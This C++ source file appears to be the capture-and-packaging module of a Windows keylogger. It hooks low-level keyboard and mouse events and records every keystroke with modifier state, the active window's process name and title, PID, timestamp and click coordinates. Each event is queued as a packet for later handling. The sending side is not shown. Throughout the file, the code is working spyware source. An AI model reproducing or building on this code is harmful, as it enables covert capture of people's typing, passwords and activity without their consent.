#include "Packager.h"


Packager::Packager()
  : _sem(0)
{
	_lshift = false;
	_rshift = false;
	_lwin = false;
	_rwin = false;
	_lctrl = false;
	_rctrl = false;
	_alt = false;
	_altGr = false;
}


Packager::~Packager()
{
}


void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
	_lshift = (info->vkCode == VK_LSHIFT && wParam == 256) ? true : _lshift;
	_lshift = (info->vkCode == VK_LSHIFT && wParam == 257) ? false : _lshift;

	_rshift = (info->vkCode == VK_RSHIFT && wParam == 256) ? true : _rshift;
	_rshift = (info->vkCode == VK_RSHIFT && wParam == 257) ? false : _rshift;

	_lctrl = (info->vkCode == VK_LCONTROL && wParam == 256) ? true : _lctrl;
	_lctrl = (info->vkCode == VK_LCONTROL && wParam == 257) ? false : _lctrl;

	_rctrl = (info->vkCode == VK_RCONTROL && wParam == 256) ? true : _rctrl;
	_rctrl = (info->vkCode == VK_RCONTROL && wParam == 257) ? false : _rctrl;

	_lwin = (info->vkCode == VK_LWIN && wParam == 256) ? true : _lwin;
	_lwin = (info->vkCode == VK_LWIN && wParam == 257) ? false : _lwin;

	_rwin = (info->vkCode == VK_RWIN && wParam == 256) ? true : _rwin;
	_rwin = (info->vkCode == VK_RWIN && wParam == 257) ? false : _rwin;

	_alt = (info->vkCode == 164 && wParam == 260) ? true : _alt;
	_alt = (info->vkCode == 164 && wParam == 257) ? false : _alt;

	_altGr = (info->vkCode == 165 && wParam == 260) ? true : _altGr;
	_altGr = (info->vkCode == 165 && wParam == 257) ? false : _altGr;


	if (wParam != 257) {
		PaquetKeys *tmp = new PaquetKeys();

		std::string fullActiveName;
		std::string *activeNamePtr;

		activeNamePtr = SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID());
		fullActiveName = *activeNamePtr + " - " + *SelfUtils::getActiveWindowTitle();
		tmp->setActive(fullActiveName);
		delete activeNamePtr;

		tmp->setDate(SelfUtils::secondsSinceEpoch());
		tmp->setPid(SelfUtils::getActiveWindowPID());

		std::vector<uint8_t> keys;
		_lshift ? keys.push_back(VK_LSHIFT) : 0;
		_rshift ? keys.push_back(VK_RSHIFT) : 0;

		_lctrl ? keys.push_back(VK_LCONTROL): 0;
		_rctrl ? keys.push_back(VK_RCONTROL) : 0;

		_lwin ? keys.push_back(VK_LWIN) : 0;
		_rwin ? keys.push_back(VK_RWIN) : 0;

		_alt ? keys.push_back(164) : 0;
		_altGr ? keys.push_back(165) : 0;

		bool repeat = false;
		for (uint8_t key : keys) {
			if (key == info->vkCode)
				repeat = true;
		}
		if (!repeat) {
			keys.push_back(info->vkCode);
		}
		tmp->setText(keys);
		tmp->createPaquet();
		_sem.post();
		_paquets.push_back(tmp);
	}
}

void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
	MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
	PaquetMouse *tmp = new PaquetMouse();

	std::string fullActiveName;
	fullActiveName = *SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID()) + "-"
		+ *SelfUtils::getActiveWindowTitle();
	tmp->setActive(fullActiveName);

	tmp->setDate(SelfUtils::secondsSinceEpoch());
	tmp->setPid(SelfUtils::getActiveWindowPID());

	tmp->setX(info->pt.x);
	tmp->setY(info->pt.y);

	WORD highOrder = info->mouseData >> 16;
	tmp->setButton(wParam == WM_LBUTTONDOWN ? 1 :
		(wParam == WM_RBUTTONDOWN ? 4 :
			(wParam == WM_MBUTTONDOWN ? 2 :
				(highOrder == XBUTTON1 ? 8 :
					(highOrder == XBUTTON2 ? 16 : 0)))));

	tmp->createPaquet();
	_sem.post();
	_paquets.push_back(tmp);
}

size_t Packager::isLeft() {
	_sem.wait();
	return _paquets.size();
}

Paquet *Packager::getPaquet() {
	return _paquets.front();
}

void Packager::supprPaquet() {
	if (_paquets.front())
		delete _paquets.front();
	_paquets.erase(_paquets.begin());
}
